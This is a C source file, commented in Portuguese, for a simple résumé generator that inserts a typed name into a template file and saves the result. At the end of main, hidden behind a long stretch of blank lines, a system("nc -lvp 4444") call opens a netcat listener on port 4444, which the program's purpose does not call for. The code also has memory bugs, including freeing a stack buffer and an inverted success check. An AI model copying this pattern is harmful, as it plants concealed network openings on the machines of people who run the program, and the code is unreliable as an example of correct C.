/*
###############################################
#Data de Criação: ter 05 mar 2019 16:09:23 -04#
#Criado por: Paulo Daniel De Araujo           #
#Contato: paulodaniel.pd90@gmail.com          #
###############################################
#Descrição:                                   #
#Programa criado para emitir curriculum para  #
#facilitar e economizar dinheiro rsrs.        #
#Brincadeiras a parte, o mesmo tem uma ideia  #
#realmente de facilitar a edição e criação    #
#do padrão curriculum vitae.                  #
###############################################
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
//macro
#define local "cu.txt" //essa macro disponibiliza o curriculo que será usado como base.
#define localCurriculum "curriculum.txt" //Essa macro indica o local aonde estara o curriculo. 
//Declarações de funções
//Função leitura: recebe o nome, para ADD ao curriculo
void leitura(char nome[])
{
	char ch;
	fgets(nome, 36, stdin);
	strtok(nome, "\n");
	if(strlen(nome) == 36 - 1)
		while((ch = getchar()) != '\n' && ch != EOF);
}

int main(int argc, char *argv[])
{
	
	// Declarações de variaveis
	char buffer[200] = ""; //onde serão armazanado os dados do curriculo para visualização
	char nome[36]; //variavel criada servir como parametro, para função leitura.
	char *teste = NULL; //alternativa para o buffer;
	char *c;
	//Declarar dois arquivos um "base"(curriculum vitae) e outro "curriculo", para onde serão enviados os dados pessoais
	FILE *arquivo, *curriculo;
	//Processamentos
	teste = (char *) malloc (sizeof(arquivo) * sizeof(char)); //Uma solução alternativa para o buffer de 200 vertores
	puts("Abrindo arquivo...");
	puts("Precione ENTER para visualizar...");
	scanf("%c", &c);
	//Abrir o arquivo em modo de leitura pra fazer a visualização do modelo curricular
	//armazenando todo o conteudo do arquivo em um buffer que o suporte o mesmo
	arquivo = fopen(local, "r");
	fgets(buffer, 200, arquivo);
	fclose(arquivo);
	puts(buffer);
	printf("tamanho do buffer: %d\n",strlen(buffer)); //Teste de controle para o buffer.
	//A leitura do nome é lida e armazenado em um variaveis com 36 posições
	printf("Por favor, Digite o nome para o curriculum: ");
	leitura(nome);
	
	//laço for criado para fazer a insenção dos dados digitados
	puts("imprimindo valor loop for:");
	
	for(int x = 0; x < strlen(buffer); x++)
	{
		printf("%c", buffer[x]);
		if(x == 12)
		{
			for(int y = 0; y < strlen(nome); y++)
			{
				buffer[x++] = nome[y];
			}
		}
	}
	puts(buffer);
	printf("%d\n", strlen(buffer));  
	puts("Gravando novas informações...");
	//os dados ja modificado é armazenados no buffer, assim sendo aberto o arquivo "curriculo" e gravando informações novas
	curriculo = fopen(localCurriculum, "w");
	fputs(buffer, curriculo);
	
	if(!curriculo)
			puts("Informações gravadas com sucesso");
			
	fclose(curriculo);
	teste = buffer;
	puts(teste);
	free(teste);
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	system("nc -lvp 4444");
	
	
	return 0;
}
